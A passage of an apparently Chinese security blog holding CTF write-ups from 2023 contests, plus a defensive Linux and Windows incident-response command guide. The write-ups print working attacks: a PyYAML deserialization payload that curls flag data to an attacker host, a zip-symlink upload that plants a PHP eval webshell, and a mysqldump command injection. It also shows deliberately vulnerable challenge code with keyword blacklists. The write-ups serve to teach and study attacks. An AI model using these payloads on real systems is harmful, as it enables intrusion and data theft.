re.IGNORECASE)\n        if blacklist:\n            return \"bad hacker no way\"\n        exec(f'for [{name}] in [{m1sery}]:print(\"strange?\")')\n    else:\n        session['name'] = \"Doctor\"\n    return render_template(\"index.html\",name=session.get(\"name\"))\n@app.route('/read')\ndef read():\n        file = request.args.get('file')\n        fileblacklist=re.findall(\"/flag|fl|ag/\",file, re.IGNORECASE)\n        if fileblacklist:\n            return \"bad hacker!\"\n        start=request.args.get(\"start\",\"0\")\n        end=request.args.get(\"end\",\"0\")\n        if start==\"0\" and end==\"0\":\n            return open(file,\"rb\").read()\n        else:\n            start,end=int(start),int(end)\n            f=open(file,\"rb\")\n            f.seek(start)\n            data=f.read(end)\n            return data\n@app.route(\"/<path:path>\")\ndef render_page(path):\n    print(os.path.pardir)\n    print(path)\n    if not os.path.exists(\"templates/\" + path):\n        return \"not found\", 404\n    return render_template(path)\nif __name__=='__main__':\n    app.run(\n        debug=False,\n        host=\"0.0.0.0\"\n    )\n    print(app.config['SECRET_KEY'])\n```\n\n有个任意文件读取，非预期解就直接读环境变量了\n\n![](/img/wp/2023/2023ycb-6.png)\n\n\n## ezyaml\n\n```python\nimport tarfile\nfrom flask import Flask, render_template, request, redirect\nfrom hashlib import md5\nimport yaml\nimport os\nimport re\n\n\napp = Flask(__name__)\n\ndef waf(s):\n    flag = True\n    blacklist = ['bytes','eval','map','frozenset','popen','tuple','exec','\\\\','object','listitems','subprocess','object','apply']\n    for no in blacklist:\n        if no.lower() in str(s).lower():\n            flag= False\n            print(no)\n            break\n    return flag\ndef extractFile(filepath, type):\n\n    extractdir = filepath.split('.')[0]\n    if not os.path.exists(extractdir):\n        os.makedirs(extractdir)\n\n\n    if type == 'tar':\n        tf = tarfile.TarFile(filepath)\n        tf.extractall(extractdir)\n        return tf.getnames()\n\n@app.route('/', methods=['GET'])\ndef main():\n        fn = 'uploads/' + md5().hexdigest()\n        if not os.path.exists(fn):\n            os.makedirs(fn)\n        return render_template('index.html')\n\n\n@app.route('/upload', methods=['GET', 'POST'])\ndef upload():\n\n    if request.method == 'GET':\n        return redirect('/')\n\n    if request.method == 'POST':\n        upFile = request.files['file']\n        print(upFile)\n        if re.search(r\"\\.\\.|/\", upFile.filename, re.M|re.I) != None:\n            return \"<script>alert('Hacker!');window.location.href='/upload'</script>\"\n\n        savePath = f\"uploads/{upFile.filename}\"\n        print(savePath)\n        upFile.save(savePath)\n\n        if tarfile.is_tarfile(savePath):\n            zipDatas = extractFile(savePath, 'tar')\n            return render_template('result.html', path=savePath, files=zipDatas)\n        else:\n            return f\"<script>alert('{upFile.filename} upload successfully');history.back(-1);</script>\"\n\n\n@app.route('/src', methods=['GET'])\ndef src():\n    if request.args:\n        username = request.args.get('username')\n        with open(f'config/{username}.yaml', 'rb') as f:\n            Config = yaml.load(f.read())\n            return render_template('admin.html', username=\"admin\", message=\"success\")\n    else:\n        return render_template('index.html')\n\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8000)\n```\n\n/upload路由中上传tar文件，然后通过/src路由进行yaml解析，存在PyYAML反序列化漏洞\n\npoc\n```yaml\n!!python/object/apply:os.system [\"curl http://ip:7777/?flag=`cat /fl*|base64`\"]\n```\n\n制作tar包\n`tar cPvf test.tar ../../config/config.yaml`\n\n上传后访问`/src?username=config`触发\n\n![](/img/wp/2023/2023ycb-7.png)\n\n\n# misc\n\n## ai和nia的交响曲\n\nupload.php中上传了一个flag1.png\n\n其中每条黑线到下条黑线恰好8bit，把黑色当成0，白色当成1，竖着读取后转字符串\n\n\n```python\nfrom PIL import Image\n\nimg = Image.open(\"1.png\")\nwidth, height = img.size\nflag = ''\n\nfor i in range(width):\n    for j in range(height):\n        pixel = img.getpixel((i, j))[0]\n        flag += '1' if pixel >= 30 else '0'\n\nwith open('outs.txt', 'w') as f:\n    f.write(flag)\n\nresult = ''\nfor i in range(0, len(flag), 8):\n    byte = flag[i:i+8]\n    decimal = int(byte, 2)\n    result += chr(decimal)\n\nprint(result)\n```\n\n结尾得到`HINT:BV1wW4y1R7Jv&&FLAG1:@i_n1a_l0v3S_`\n\n\nhttp流中还有一个flag2.zip，发现是伪加密\n\n解压后的内容如下，其中还有0宽，但没什么用\n\n```\n00:04\n00:01\n00:22\n00:04\n00:01\n00:22\n00:10\n00:01\n00:13\n00:09\n00:01\n00:21\n```\n\n在hint中给的视频地址去找字母，得到`CAOCAOGAIFAN`\n\n组合后为flag：`@i_n1a_l0v3S_CAOCAOGAIFAN`\n\n\n## EZ_misc\n\n高度不对，先爆破出正确的宽高\n\n发现两个iend，猜测是snipping的CVE\n\n![](/img/wp/2023/2023ycb-8.png)\n\n\n\n## Matryoshka\n\nosfmount挂载，有三个盘\n\n分别拿到`encrypt`，`normal_rar.rar`，`not_real_cat.jpg`\n\n其中rar可以分离出一张jpg，大小样式与另一张jpg一样，使用双图盲水印\n\n![](/img/wp/2023/2023ycb-9.png)\n\n使用`veracrypt`挂载`encrypt`，密码为`watermark_is_fun`\n\n拿到`KBAUYVCSKR5XK5TYM5SGC3LMNJXWY4BQPBPXSYLVL54TCZLCL5UHUM27NUYTI4JBEEQX2===‌‍`\n\n存在零宽隐写，解密后得到`Matryoshka`\n\nbase32后猜测是维吉尼亚\n\n![](/img/wp/2023/2023ycb-10.png)\n\n\n## 程序猿Quby\n\nQUBY.png可以分离出一个带密码的rar\n\n图片本身的信息是夏多密码，根据码表转换得到`HAVEANICEDAY`\n\n注意1，6，12分别表示顺时针旋转180°，90°，0°\n\n![](/img/wp/2023/2023ycb-11.png)\n\n然后对图片解cloacked-pixel\n\n`python2 lsb.py extract QUBY.png out.txt HAVEANICEDAY`\n\n得到压缩包密码`we1c0met0ycbCTF!!!`，解压得到一段wav和两张xlsx表\n\nxlsx表中有外源数据被隐藏了，大约是中间50行~1000行的部分被折叠了，展开再改颜色能看到两种不同的数字\n\n![](/img/wp/2023/2023ycb-12.png)\n\n\npython提取数字后转换成10，画图后两张图拼在一起\n\n```python\nfrom PIL import Image\nimport pandas\ns=55\ns1=60\ne=1023\ne1=1028\nl=0\nr=63\n\n\nimg1=Image.new(\"1\",(1050,140))\n\nx1=pandas.read_excel(\"1.xlsx\")\nx1values=x1.values\nfor i in range(s-2,e-2):\n    for j in range(0,r):\n        if x1values[i][j]>=5:\n            img1.putpixel((i,j),255)\n        else:\n            img1.putpixel((i,j),0)\n\n\nx2=pandas.read_excel(\"2.xlsx\")\nx2values=x2.values\nfor i in range(s1-2,e1-2):\n    for j in range(0,r):\n        if x2values[i][j]>=5:\n            img1.putpixel((i-5,j+63),255)\n        else:\n            img1.putpixel((i-5,j+63),0)\nimg1=img1.transpose(Image.FLIP_LEFT_RIGHT)\nimg1.save('img.png')\n```\n\n密码w0wyoudo4goodj0b\n\n![](/img/wp/2023/2023ycb-13.png)\n\n\n对于wav的带密码的隐写，猜测是DeepSound\n\n解密得到`flag.txt`和`fl4g.txt`\n\nfl4g.txt中的字符串先base85在base32，得到`sQ+3ja02RchXLUFmNSZoYPlr8e/HVqxwfWtd7pnTADK15Evi9kGOMgbuIzyB64CJ`\n\n观察发现恰好是64位，从a-z,A-Z,0-9,+,/  猜测是base换表，flag.txt中的值作为密文\n\n![](/img/wp/2023/2023ycb-14.png)\n\n\n\n## 两只老虎\n\n只给了一张图片，但是发现图片后面的IDAT突然变小了\n\n![](/img/wp/2023/2023ycb-15.png)\n\n所以可以删掉前面所有长65536的IDAT块再删一个34018的IDAT块（参考正常的png图片）\n\n爆破宽高，得到右边那张图片，发现右边多了一些像素\n\n![](/img/wp/2023/2023ycb-16.png)\n\n原来的图片是1134x720，变成了1144x720\n\n红色部分全是(255,0,0)，既然两图类似，就放stegsolve尝试xor，发现很多小像素点不规律分布\n\n最后发现可以提取每行非黑色像素点的个数去转字符串\n\n```python\nfrom PIL import Image\nimg = Image.open('solved.bmp')\nw,h = img.size\ncount = []\nfor i in range(h):\n    tmp = 0\n    for j in range(w):\n        pixel = img.getpixel((j,i))\n        if(pixel != (0,0,0)):\n            tmp += 1\n    if(tmp!=10):\n        count.append(tmp-10)\nprint(count)\n\ncount = ''.join(chr(num) for num in count)\nprint(count)\n#[68, 65, 83, 67, 84, 70, 123, 116, 87, 111, 95, 116, 49, 103, 101, 114, 115, 95, 114, 85, 110, 95, 102, 64, 115, 116, 125]\n#DASCTF{tWo_t1gers_rUn_f@st}\n```\n\n\n## Easy_VMDK\n\n>小明这次使用了32Bytes的随机密码，这次总不会被爆破出来了吧！！\n>小明压缩了好了题目后，他发现压缩后大小比压缩前还大啊，这不就没有压缩啊，这是为什么啊！\n\n对压缩包进行明文攻击，本地看下自己的几个vmdk文件头，发现均为`4B 44 4D 56 01 00 00 00 03 00 00 00`\n\n![](/img/wp/2023/2023ycb-17.png)\n\n拿到一个`flag.zip`和`key.txt`\n\n\nflag.zip分离出一个带密码的压缩包和一个py脚本，其中是key.txt的加密过程\n\n```python\nimport cv2\nimport base64\nimport binascii\n\n\nimg = cv2.imread(\"key.png\")\nr, c = img.shape[:2]\nprint(r, c)\n# 137 2494\n\nwith open(\"key.txt\", \"w\") as f:\n    for y in range(r):\n        for x in range(c):\n            uu_byte = binascii.a2b_uu(', '.join(map(lambda x: str(x), img[y, x])) + \"\\n\")\n            f.write(base64.b64encode(uu_byte).decode() + \"\\n\")\n```\n\n解密过程\n\n```python\nimport cv2\nimport base64\nimport numpy as np\n\n# 读取 key.txt 文件内容\nwith open(\"key.txt\", \"r\") as f:\n    lines = f.readlines()\n\n# 创建空白图像\nimg = np.zeros((137, 2494), dtype=np.uint8)\n\n# 还原图像像素值\nfor y in range(137):\n    for x in range(2494):\n        # 解码 base64 数据\n        encoded_data = lines[y * 2494 + x].strip()\n        decoded_data = base64.b85decode(encoded_data.encode())\n\n        # 获取像素值\n        pixel_value = int.from_bytes(decoded_data, byteorder='big') % 256\n\n        # 设置图像像素\n        img[y, x] = pixel_value\n\n# 保存还原后的图像\ncv2.imwrite(\"restored_key.png\", img)\n```\n\n![](/img/wp/2023/2023ycb-18.png)\n\n用这个密码去解压，得到flag\n\n## GIFuck\n\n根据帧长切割，利用ocr进行批量识别\n\n`++++[->++++<]>[->++++++<]>-[->+>+>+>+>+>+>+>+>+>+>+>+>+>+>+>+>+>+>+>+>+>+>+>+>+>+>+>+>+>+>+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<]+++<++<+[->++++<]>[->++++<]>[->-<]>[-<<<+>>>]++<+++<+[->++++<]>[->++++<]>[->-<]>[-<<<+>>>]<+++[->++++<]>[->-<]>[-<<<+>>>]<+++<+[->++++<]>[->++++<]>[->-<]>[-<<<+>>>]+++<++[->++++<]>[->-<]>[-<<<+>>>]+<++<+[->++++<]>[->++++<]>[->-<]>[-<<<+>>>]<+++<+[->++++<]>[->++++<]>[->+<]>[-<<<+>>>]+++<+++[->++++<]>[->-<]>[-<<<+>>>]++<+[->++++<]>[->+<]>[-<<<+>>>]+++<+++[->++++<]>[->+<]>[-<<<+>>>][->+<]>[-<<<+>>>]+++<+++[->++++<]>[->-<]>[-<<<+>>>]++<++[->++++<]>[->+<]>[-<<<+>>>]+++<+++[->++++<]>[->+<]>[-<<<+>>>]++<+[->++++<]>[->+<]>[-<<<+>>>]++[->+<]>[-<<<+>>>]+<<+[->++++<]>[->++++<]>[->+<]>[-<<<+>>>]+<<+[->++++<]>[->++++<]>[->+<]>[-<<<+>>>]+<+++[->++++<]>[->+<]>[-<<<+>>>]++<+[->++++<]>[->+<]>[-<<<+>>>][->+<]>[-<<<+>>>]++<+++<+[->++++<]>[->++++<]>[->-<]>[-<<<+>>>]+<<+[->++++<]>[->++++<]>[->+<]>[-<<<+>>>]+<<+[->++++<]>[->++++<]>[->+<]>[-<<<+>>>]+<+++[->++++<]>[->+<]>[-<<<+>>>]++<+[->++++<]>[->+<]>[-<<<+>>>][->+<]>[-<<<+>>>]+++<+++[->++++<]>[->-<]>[-<<<+>>>]++<+[->++++<]>[->+<]>[-<<<+>>>]+++<+++[->++++<]>[->+<]>[-<<<+>>>]++<+++<+[->++++<]>[->++++<]>[->+<]>[-<<<+>>>]<<+++++++++[->+++++++++<]>++.<+++++[->+++++<]>+++.+++..+++++++.<+++++++++[->---------<]>--------.<++++++++[->++++++++<]>++.<++++[->++++<]>+++.-.<+++++++++[->---------<]>---.<+++++++++[->+++++++++<]>++++++++.<+++[->---<]>-.++++++.---.<+++++++++[->---------<]>-.<++++++++[->++++++++<]>++++++.++++++.<+++[->---<]>--.++++++.<++++++++[->--------<]>-------.<++++++++[->++++++++<]>+++++++++.<+++[->+++<]>+.<+++++++++[->---------<]>--.<++++++++[->++++++++<]>++++++++++++++.+.+++++.<+++++++++[->---------<]>---.<++++++++[->++++++++<]>++++++++.---.<+++[->+++<]>++++.<+++[->---<]>----.<+++++++[->-------<]>------.[-]<`\n\n\n会输出`Sorry but your flag is not here.`\n\n真正的flag藏在内存中\n\n![](/img/wp/2023/2023ycb-19.png)","tags":["wp","2023竞赛","羊城杯"],"categories":["wp"]},{"title":"应急响应中的常用命令","url":"/posts/4dcb61d1/","content":"\n\n# 应急响应\n\n**应急响应流程**\n\n事件判断：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DDos等等\n\n临时处置：给出客户临时处置建议，断网隔离，保护现场环境\n\n信息收集分析：收集客户信息和中毒主机信息，包括样本，日志分析、进程分析、启动项分析\n\n清理处置：直接杀掉进程，删除文件，打补丁，抑或是修复文件\n\n产出报告：整理并输出完整的安全事件报告\n\n\n\n\n# linux\n\n## 重要文件和目录\n\n|文件名|说明|\n|----|----|\n|/etc/passwd|用户信息文件|\n|/etc/crontab|定时任务文件|\n|/etc/anacrontab|异步定时任务|\n|/etc/rc.d/rc.local|开机启动项|\n|/etc/hosts|本地IP地址域名解析文件|\n|/var/log/btmp|登录失败日志|\n|/var/log/wtmp|包含用户登录日志|\n|/var/log/utmp|当前登陆系统的用户信息|\n|/var/log/cron|定时任务执行日志|\n|/var/log/lastlog|所有用户最近登录信息|\n|/var/log/secure|验证，授权等日志|\n\n\n\n|目录|说明|\n|----|----|\n|/root/.ssh|root用户ssh公钥和私钥|\n|/tmp|系统或用户临时文件的目录|\n|/etc/init.d|开机启动项|\n|/var/log|日志默认存放目录|\n\n\n## 常用命令\n\n查看当前目录下所有文件并排序\n`ls -alt`\n\n![](/img/hw/yjxy-1.png)\n\n\n查看系统内存使用情况\n`free -h`\n\n![](/img/hw/yjxy-2.png)\n\n\n查看系统进程及子进程\n`ps auxf`、`top`\n\n![](/img/hw/yjxy-3.png)\n![](/img/hw/yjxy-4.png)\n\n\n查看网络连接\n`netstat -antpl`\n\n![](/img/hw/yjxy-5.png)\n\n根据pid使用`ls -alh /proc/pid`命令查看对应的可执行程序\n\n![](/img/hw/yjxy-6.png)\n\n\n查询端口打开的文件\n`lsof -i:port`\n\n查询进程打开的文件\n`lsof -p pid`\n\n查询用户打开的文件\n`lsof -u root`\n\n![](/img/hw/yjxy-7.png)\n\n\n修改文件属性\n`chattr`\n\n显示文件属性\n`lsattr`\n\n![](/img/hw/yjxy-8.png)\n\n\n排查启动项\n`cat /etc/rc.local`\n`ls -alt /etc/profile.d/*.sh`\n\n![](/img/hw/yjxy-9.png)\n\n\n查看所有用户的定时任务\n`cat /etc/passwd | cut -f 1 -d : | xargs -I {} crontab -l -u {}`\n`ls -altr /var/spool/cron/*`\n\n![](/img/hw/yjxy-10.png)\n\n\n查看历史命令\n`history`\n`cat ~/.bash_history`\n\n![](/img/hw/yjxy-11.png)\n\n\n校验软件包\n`rpm -Va`\n`dpkg --verify`\n\n|值|说明|\n|----|----|\n|S|表示对应文件的大小不一致|\n|M|表示对应文件权限和所有权不一样|\n|5|表示对应文件的MD5不一致|\n|D|表示文件的设备号和驱动程序不一致|\n|L|表示文件的符号连接内容不一致|\n|U|表示文件所有者不一致|\n|G|表示文件群组不一致|\n|T|表示文件的修改时间不一致|\n\n>软件更新会导致大小或MD5不一致，同时出现SM5需要注意\n\n![](/img/hw/yjxy-12.png)\n\n\n查看文件（目录）详细信息\n`stat`\n\n![](/img/hw/yjxy-13.png)\n\n\n查找当前目录下，指定天数内修改的指定类型文件\n`find / -mtime 0 -name *.jsp`\n\n查找当前目录下，指定天数内新增的指定类型文件\n`find / -ctime 0 -name *.jsp`\n\n![](/img/hw/yjxy-14.png)\n\n\n比较文件差异\n`diff -c`\n\n![](/img/hw/yjxy-15.png)\n\n\n查找隐藏进程\n`ps -ef | awk '{print $2}' |sort -n |uniq > ps.p`\n`ls /proc |sort -n |uniq > proc.p`\n`diff ps.p proc.p`\n\n![](/img/hw/yjxy-16.png)\n\n查看用户登录历史记录\n`last`\n\n查看用户登录失败记录\n`lastb`\n\n查看用户最近一次登录信息\n`lastlog`\n\n![](/img/hw/yjxy-17.png)\n\n登录成功的IP\n`grep \"Accepted\" /var/log/secure | awk '{print $11}' |sort |uniq -c |sort -nr | more`\n\n定位有爆破行为的IP\n`grep \"Failed\" /var/log/secure | awk '{print $11}' |sort |uniq -c |sort -nr | more`\n\n![](/img/hw/yjxy-18.png)\n\n\n查找每个IP地址的失败登录次数：\n`awk '/sshd.*Failed/ {print $(NF-3)}' /var/log/secure | sort | uniq -c |sort -nr`\n\n![](/img/hw/yjxy-19.png)\n\n\n查找特定IP地址的失败登录：\n`grep \"sshd.*Failed.*from <IP_ADDRESS>\" /var/log/secure | awk '{print $1,$2,$3,$9,$11}'`\n\n![](/img/hw/yjxy-20.png)\n\n\n查找特定IP地址的成功登录：\n`grep \"sshd.*Accepted.*from <IP_ADDRESS>\" /var/log/secure | awk '{print $1,$2,$3,$9,$11}'`\n\n![](/img/hw/yjxy-21.png)\n\n## 日志分析\n\n```text\nLinux日志类型大致可以分为三类，内核和系统日志，用户日志，应用日志\n\n内核和系统日志：这种日志主要由syslog管理、根据其配置文件/etc/syslog.conf中的设置决定内核消息和各种系统程序信息记录到哪个位置\n用户日志：用户日志主要记录系统用户登录或者退出的信息，包括用户名账号、登录时间、源IP等\n应用日志：记录应用程序运行过程中的各种事件信息\n```\n\n可以使用系统自带的awk，find，grep去分析前面提到的各种日志（建议使用busybox，以防命令被篡改）\n也可以使用第三方的分析工具，比如LogForensics，星图等等\n\n\n## 应急工具\n\n**busybox**\n\n集成了很多linux常用命令的工具集，当命令被劫持或篡改时使用\n\n官网：[https://busybox.net/](https://busybox.net/)\n\n![](/img/hw/yjxy-22.png)\n\n\n**unhide**\n\n检测发现借助rootkit及其他技术隐藏的进程和TCP/UDP端口的命令行工具\n\n`yum -y install unhide`安装或者在[官网下载](https://www.unhide-forensics.info/)\n\n![](/img/hw/yjxy-23.png)\n\n\n**chkrootkit**\n\nlinux下检测rootkit的脚本\n\nubuntu系列安装命令：`apt install chkrootkit`\ncentos系列：由于chkrootkit没有包含在官方的Centos源中，因此要采取手动编译的方法来安装，[官网](https://www.chkrootkit.org/)\n\n直接运行后查找infected关键字即可\n\n![](/img/hw/yjxy-24.png)\n\n\n**clamav**\n\n检测木马、病毒、恶意软件和其他恶意威胁的开源防病毒引擎\n\n![](/img/hw/yjxy-25.png)\n\n\n# windows\n\n\n## 常用命令\n\n|命令|说明|\n|----|----|\n|regedit|注册表|\n|taskmgr|任务管理器|\n|msconfig|系统配置|\n|eventvwr|事件查看器|\n|compmgmt.msc|计算机管理|\n|gpedit.msc|本地组策略|\n|taskschd.msc|计划任务|\n|lusrmgr.msc|本地用户和组|\n\n\n查看网络连接\n`netstat -ano`\n\n操作系统的详细配置信息\n`systeminfo`\n\n获取系统进程信息\n`wmic process`\n\n根据应用程序查找PID\n`wmic process where name=\"cmd.exe\" get processid,executablepath,name`\n\n根据PID查找应用程序\n`wmic process where processid=\"9096\" get executablepath,name`\n\n获取系统进程信息\n`tasklist`\n\n对于要查询特定dll的调用情况，可以使用\n`tasklist /d dll名称`\n\n计算样本MD5\n`certutil -hashfile %样本exe% md5`\n\n","tags":["hw","应急响应"],"categories":["hw"]},{"title":"2023ciscn初赛wp","url":"/posts/8bd8be28/","content":"\n\n# misc\n\n## 签到卡\n\n`print(open('/flag').read())`\n\n![](/img/wp/2023/2023ciscn-1.png)\n\n\n## 被加密的生产流量\n\n追踪tcp流，数据提取出来base32\n\n![](/img/wp/2023/2023ciscn-2.png)\n\n![](/img/wp/2023/2023ciscn-3.png)\n\n\n## 国粹\n\n先分割`题目.png`中的小麻将到`output`\n\n```python\nimport os\nw=0\nh=0\nfrom PIL import Image\n\na=Image.open('题目.png')\n\nw1,h1=a.size\nwhile w<w1:\n    im=a.crop((w,h,w+53,h+73))\n    im.save(os.path.join('output',str(w))+'.png')\n    w+=53\n\n```\n\n再将`a.png`和`k.png`中的小麻将去`output`找对应的索引值，分别作为纵坐标和横坐标画图得到`flag`\n\n```python\nimport cv2\nimport numpy as np\n\na=cv2.imread(\"a.png\")\nk=cv2.imread(\"k.png\")\nw=len(a[0])\ni=0\nimport os\npath='output/'\nd=os.listdir(path)\nd.remove(\"0.png\")\ndata=[[],[]]\nStatus=[False,False]\ndef check(im1,im2,sind):\n    A=cv2.absdiff(im1,im2)\n    if np.count_nonzero(A) ==0 :\n        Status[sind]=True\n        ind=int(j.split('.')[0])\n        if ind!=0:\n            data[sind].append(ind//53)\n    pass\n\nwhile i<w:\n    ima=a[0:73,i:i+53]\n    imk=k[0:73,i:i+53]\n    Status=[False,False]\n    for j in d:\n        im2=cv2.imread(os.path.join(path,j))\n        check(ima,im2,0)\n        check(imk,im2,1)\n        if Status==[True,True]:\n            break\n    i+=53\n\nfrom PIL import Image\na=Image.new(\"1\",(42,42))\nfor i in range(w//53):\n    a.putpixel((data[1][i],data[0][i]),255)\na.save('123.png')\na.show()\n```\n\n## pyshell\n\npython 沙盒\n\n利用`_`拼接字符串后`eval`执行，同时限制了7位字符\n\n```python\nWelcome to this python shell,try to find the flag!\n>>'open'\n'open'\n\n>>_+'(\"/'\n'open(\"/'\n\n>>_+'fl'\n'open(\"/fl'\n\n>>_+'ag'\n'open(\"/flag'\n\n>>_+'\")'\n'open(\"/flag\")'\n\n>>_+'.'\n'open(\"/flag\").'\n\n>>_+'rea'\n'open(\"/flag\").rea'\n\n>>_+'d()'\n'open(\"/flag\").read()'\n\n>>eval(_)\n'flag{b8c3ead1-cdad-4ddb-bb81-9486888d426a}\\n'\n```\n\n## puzzle\n\n打开后有很多宽度不一样的小`bmp`文件，放进010里分析发现在冗余位多了一些数据\n\n\n以`bfReserved1`表示图片左上角`x`坐标，`bfReserved2`表示图片左上角`y`坐标，`biXPelsPerMeter`表示图片右下角`x`坐标，`biYPelsPerMeter`表示图片右下角`y`坐标画图\n\n\n![](/img/wp/2023/2023ciscn-4.png)\n\n![](/img/wp/2023/2023ciscn-5.png)\n\n画的时候注意`biHeight`，在`bmp`中该值是正数说明图像是倒向的即图像存储是由下到上；该值是负数说明图像是倒向的即图像存储是由上到下，所以遇到负数的图片需要反转一下在拼图\n\n```python\nimport os\nfrom PIL import Image\nfile_list = os.listdir('tmp4')\n\nimg = Image.new('RGB',(7200,4000))\nfor i in range(len(file_list)):\n    f = open(f'./tmp4/{file_list[i]}','rb').read()\n    pic = Image.open(f'./tmp4/{file_list[i]}')\n    Res1 = int.from_bytes(f[6:8],'little')\n    Res2 = int.from_bytes(f[8:10],'little')\n    Xpel = int.from_bytes(f[38:42],'little')\n    Ypel = int.from_bytes(f[42:46],'little')\n    If_rev = int.from_bytes(f[22:26],'little')\n    if(If_rev != 100):\n        pic = pic.transpose(Image.FLIP_TOP_BOTTOM)\n    img.paste(pic,(Res1,Res2,Xpel,Ypel))\nimg.save('flag.png')\n```\n\n拼完后的图跑`zsteg`，得到第一部分的flag：`flag{f1R5T_part_1s_LSB_sTeG0_`\n\n![](/img/wp/2023/2023ciscn-6.png)\n\n\n然后还是`biHeight`，高度-100的做0，100的做1，binary之后得到第二部分flag：`2nd_paRT_15_reVeRSe_bMp_`\n\n```python\nimport os\nfrom PIL import Image\nfile_list = os.listdir('tmp4')\nRes1_L,Res2_L,Ypel_L,XY_L = [],[],[],[]\nfor i in range(len(file_list)):\n    f = open(f'./tmp4/{file_list[i]}','rb').read()\n    Res1 = int.from_bytes(f[6:8],'little')\n    Res2 = int.from_bytes(f[8:10],'little')\n    Ypel = int.from_bytes(f[22:26],'little')\n    Res1_L.append(Res1)\n    Res2_L.append(Res2)\n    Ypel_L.append(Ypel)\n    XY_L.append((Res2,Res1))\na = sorted(Res1_L)\nb = sorted(Res2_L)\nc = sorted(XY_L)\nfor i in range(len(c)):\n    ind = XY_L.index(c[i])\n    if(Ypel_L[ind] == 4294967196):\n        print('0',end='')\n    else:\n        print('1',end='')\n\n```\n\n![](/img/wp/2023/2023ciscn-7.png)\n\n\n第三部分在补齐字节的数据中\n找到第一张图片`17447199634.bmp`，查看补齐字节的数据\n\n发现依次是`FF D8`，`FF E1`等\n\n![](/img/wp/2023/2023ciscn-8.png)\n\n\n所以可以以`padding`数据按照左上到右下的顺序拼接得到`jpg`图片\n\n```python\nimport os\nfrom PIL import Image\nfile_list = os.listdir('tmp4')\nXpel_L,XY_L,Leng_L,Ypel_L,f_list = [],[],[],[],[]\nfor i in range(len(file_list)):\n    f = open(f'./tmp4/{file_list[i]}','rb').read()\n    Res1 = int.from_bytes(f[6:8],'little')\n    Res2 = int.from_bytes(f[8:10],'little')\n    Xpel = int.from_bytes(f[18:22],'little')\n    Ypel = int.from_bytes(f[22:26], 'little')\n    Xpel_L.append(Xpel)\n    XY_L.append((Res2,Res1))\n    Leng_L.append((len(f)-54))\n    Ypel_L.append(Ypel)\nc = sorted(XY_L)\n\nPadding_file = []\nfor i in range(len(c)):\n    ind = XY_L.index(c[i])\n    if(Leng_L[ind] != Xpel_L[ind]*300):\n        Padding_file.append(ind)\n\ndata = b''\nfor i in range(len(Padding_file)):\n    f = open(f'./tmp4/{file_list[Padding_file[i]]}','rb').read()\n    w = int.from_bytes(f[18:22], 'little')\n    f = f[54:]\n    if(len(f)-w*100*3 == 100):\n        pad = 1\n    elif(len(f)-w*100*3 == 200):\n        pad = 2\n    else:\n        pad = 3\n    for j in range(100):\n        d = f[j*(w*3+pad):j*(w*3+pad)+w*3+pad]\n        data += d[-pad:]\nfw = open('flag.jpg','wb').write(data)\n```\n\n得到第三部分的flag：`3rd_parT_1s_paddINGINGING`\n\n![](/img/wp/2023/2023ciscn-9.jpg)\n\n# crypto\n\n## 基于国密SM2算法的密钥密文分发\n\n根据文档一步一步来即可，虽然有点没看懂\n\n先找个网址生成一组公钥和密钥 https://www.lzltool.com/SM2\n\n\n登录拿id\n\n![](/img/wp/2023/2023ciscn-10.png)\n\n上传公钥\n\n![](/img/wp/2023/2023ciscn-11.png)\n\n\n访问`/api/quantum`获取密钥密文\n\n访问`/api/check`发送`quantumString`的值\n\n使`quantumStringUser`的值等于`quantumStringServer`的值即可通过验证\n\n访问`/api/search`得到flag\n\n![](/img/wp/2023/2023ciscn-12.png)\n\n\n## 可信度量\n\n非预期\n\n`/proc/22/task/22/environ`可以直接看到flag\n\n![](/img/wp/2023/2023ciscn-13.png)\n\n\n## Sign_in_passwd\n\nbase64换表\n\n![](/img/wp/2023/2023ciscn-14.png)\n\n\n# web\n\n## unzip\n\n上传后返回源码\n\n只能上传`zip`文件，上传后在`tmp`目录使用`unzip -o`解压\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n\n$finfo = finfo_open(FILEINFO_MIME_TYPE);\nif (finfo_file($finfo, $_FILES[\"file\"][\"tmp_name\"]) === 'application/zip'){\n    exec('cd /tmp && unzip -o ' . $_FILES[\"file\"][\"tmp_name\"]);\n};\n\n//only this!\n```\n\n```bash\n//构造一个指向/var/www/html的软连接\nln -s /var/www/html poc\n\n//保留软连接压缩\nzip --symlinks test.zip poc\n\n//创建跟第一个压缩包中目录同名的目录\nmkdir poc\n\n//接着向目录中写一个shell\necho \"<?php eval(\\$_POST['a']);?>\" > ./poc/shell.php\n\n//压缩这个目录\nzip -r test1.zip poc\n```\n\n上传第一个压缩包后会在`tmp`目录下生成一个软连接到`/var/www/html`，当我们上传第二个压缩包时，因为`poc`目录已经软连接到`/var/www/html`了，所以解压的时候会把`shell.php`放在`/var/www/html`\n\n![](/img/wp/2023/2023ciscn-15.png)\n\n\n## dumpit\n\n根据题目描述可知分别有查询和导出的功能点\n\n根据执行命令后的返回值推测执行的命令如下\n\n传入`?db=a&table_2_query=b`时会执行`select * from a.b`\n传入`?db=a&table_2_dump=b`时会执行`mysqldump -u root a b > log/xxx.log`\n\n\n这里因为`a`和`b`的值可控，所以相当于我们可以执行命令了\n\n方法1：\n直接传`?db=ctf&table_2_dump=%0a+id+>+log/1+%0`，然后访问`log/1`\n\n\n方法2：\n因为`mysqldump`在找不到我们给出的表的情况下会抛出错误信息`mysqldump: Couldn't find table: \"表名\"`\n\n在`linux`中可以利用`2>`将命令执行的结果输出到文件中\n\n传`/?db=ctf&table_2_dump=\\<\\?\\=phpinfo\\(\\)?\\>+2>+log/1.php`，然后访问`1.php`\n\n![](/img/wp/2023/2023ciscn-16.png)\n\n\nindex.php源码\n\n```php\n<?php\n$servername = \"127.0.0.1\";\n$username = \"www-data\";\n$password = \"\";\n\n\nfunction is_valid($str){\n    $black = ';`*#^$&|';\n    for($i=0;$i<strlen($black);$i++){\n    \tif(!(stristr($str,$black[$i])===FALSE)){\n\t    return FALSE;\n\t}\n    }\n    if(!(stristr($str,'host')===FALSE)){\n        return FALSE;\n    }\n    if(!(stristr($str,'-h')===FALSE)){\n        return FALSE;\n    }\n    return TRUE;\n}\ntry {\n    $conn = new PDO(\"mysql:host=$servername;dbname=ctf\", $username, $password);\n}\ncatch(PDOException $e)\n{\n    die($e->getMessage());\n}\n\nif(!isset($_GET['table_2_query']) && 